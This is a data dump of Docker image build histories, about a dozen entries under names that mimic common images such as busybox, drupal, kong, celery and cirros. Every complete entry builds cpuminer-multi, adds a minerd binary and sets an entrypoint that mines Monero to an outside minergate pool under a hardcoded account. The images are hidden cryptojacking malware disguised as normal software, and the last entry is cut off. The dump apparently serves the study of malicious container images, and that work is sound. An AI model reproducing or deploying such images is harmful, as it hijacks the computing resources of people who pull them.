fehopeyeretaphearcom/packer; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
doyiheduhostlabacom/cirros; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
hukoshalarnet/avahi; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
haqsszerzcom/next; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
fifeporshnet/spiped; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
fehavoreftokennet/kong; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
htprmaildxcom/busybox; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
hukipuhostlabacom/celery; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
hujosadejshalarnet/unison; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
ganodndentcom/drupal; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
hewenagukiaxsupnet/abresk; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
genrppetwcom2/storm; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
kxqswierietk2/netsca; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > 